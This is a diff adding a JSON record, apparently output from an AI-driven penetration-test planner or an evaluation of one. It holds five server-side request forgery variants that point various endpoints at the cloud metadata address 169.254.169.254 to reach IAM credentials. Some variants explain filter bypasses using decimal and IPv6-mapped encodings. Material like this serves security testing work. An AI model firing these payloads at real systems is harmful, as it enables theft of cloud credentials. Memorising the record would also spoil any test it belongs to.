@@ -1,0 +1,68 @@
+{
+ "key": "ssrf_1",
+ "model": "opencode/deepseek-v4.1-flash-free",
+ "class": "ssrf",
+ "variants": [
+  {
+   "endpoint": "POST /api/v1/media/proxy",
+   "target_param": "image_url",
+   "recon_evidence": "The media proxy fetches the supplied image_url server-side and echoes the raw upstream body in the 502 error page when the fetch fails; responses to external CDNs confirm outbound fetches are unrestricted and the app runs on EC2.",
+   "planner_rationale": "Image proxy reaches internal hosts; aim it at the metadata service to confirm the cloud hit and enumerate credential paths.",
+   "vuln_class": "ssrf",
+   "payload": "http://169.254.169.254/latest/meta-data/",
+   "injection_point": "body",
+   "expected_success_signal": "Directory listing containing ami-id, hostname, iam, etc. echoed in the proxy error body.",
+   "confidence": 0.87,
+   "reasoning": "The proxy performs a server-side fetch of image_url and reflects the upstream response, so pointing it at 169.254.169.254 should return the metadata directory listing and map the way to IAM credentials."
+  },
+  {
+   "endpoint": "GET /webhooks/validate",
+   "target_param": "callback",
+   "recon_evidence": "Recon shows a WAF rule returning 403 specifically for requests whose callback value contains the literal dotted string 169.254.169.254, while the metadata path /latest/meta-data/ alone passes unblocked.",
+   "planner_rationale": "Dotted metadata IP is WAF-blocked; switch to the decimal integer encoding the regex misses.",
+   "vuln_class": "ssrf",
+   "payload": "http://2852039166/latest/meta-data/",
+   "injection_point": "query",
+   "expected_success_signal": "Metadata directory listing returned instead of the expected 403 WAF block.",
+   "confidence": 0.72,
+   "reasoning": "2852039166 is the 32-bit integer form of 169.254.169.254, so the socket layer resolves it to the metadata address while the WAF's dotted-quad regex never matches, which is the documented bypass for the observed behaviour."
+  },
+  {
+   "endpoint": "POST /integrations/webhook/test",
+   "target_param": "webhook_url",
+   "recon_evidence": "The webhook test feature issues an outbound HTTP request to webhook_url and returns the first 2 KB of the response; every IPv4 textual form of 169.254.169.254 (dotted, decimal, octal) is blocked by the egress filter.",
+   "planner_rationale": "All IPv4 encodings of the metadata IP are filtered; try the IPv6-mapped representation the filter does not cover.",
+   "vuln_class": "ssrf",
+   "payload": "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
+   "injection_point": "body",
+   "expected_success_signal": "Metadata directory listing appearing in the returned webhook response snippet.",
+   "confidence": 0.66,
+   "reasoning": "::ffff:a9fe:a9fe is the IPv6-mapped form of 169.254.169.254, so a stack that accepts IPv6 literals translates it back to the link-local IPv4 metadata address and slips past an IPv4-only egress filter."
+  },
+  {
+   "endpoint": "GET /cdn/thumbnail/{source}",
+   "target_param": "source",
+   "recon_evidence": "The thumbnail route takes the source URL directly from the path segment (after /cdn/thumbnail/) and fetches it server-side; the segpath is not normalised and the app runs on EC2.",
+   "planner_rationale": "Path-based fetch is unauthenticated and unnormalised; use it to reach the metadata service.",
+   "vuln_class": "ssrf",
+   "payload": "http://169.254.169.254/latest/meta-data/",
+   "injection_point": "path",
+   "expected_success_signal": "Metadata directory listing (ami-id, hostname, iam) returned as the thumbnail body.",
+   "confidence": 0.8,
+   "reasoning": "Because the source URL is taken verbatim from the path segment and fetched server-side, supplying the metadata URL in the path should trigger the same internal fetch and return the directory listing."
+  },
+  {
+   "endpoint": "GET /api/v2/preview",
+   "target_param": "X-Resource-Location",
+   "recon_evidence": "The preview endpoint reads a URL from the X-Resource-Location request header and fetches it to render a link preview; IPv4 textual forms of the metadata address are rejected, but header values are not run through the same egress validation as query parameters.",
+   "planner_rationale": "Header-supplied fetch bypasses the query-side egress validation; use the IPv6-mapped metadata address to reach IMDS.",
+   "vuln_class": "ssrf",
+   "payload": "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
+   "injection_point": "header",
+   "expected_success_signal": "Metadata directory listing rendered into the link preview response.",
+   "confidence": 0.6,
+   "reasoning": "The header value feeds the same server-side fetch, and using the IPv6-mapped encoding of 169.254.169.254 relies on the header path not sharing the IPv4-focused egress filter, which makes the outcome somewhat speculative."
+  }
+ ],
+ "raw_tail": "d_success_signal\": \"Metadata directory listing rendered into the link preview response.\",\n    \"confidence\": 0.60,\n    \"reasoning\": \"The header value feeds the same server-side fetch, and using the IPv6-mapped encoding of 169.254.169.254 relies on the header path not sharing the IPv4-focused egress filter, which makes the outcome somewhat speculative.\"\n  }\n]\n\u001b[0m\n> build · deepseek-v4.1-flash-free\n"
+}
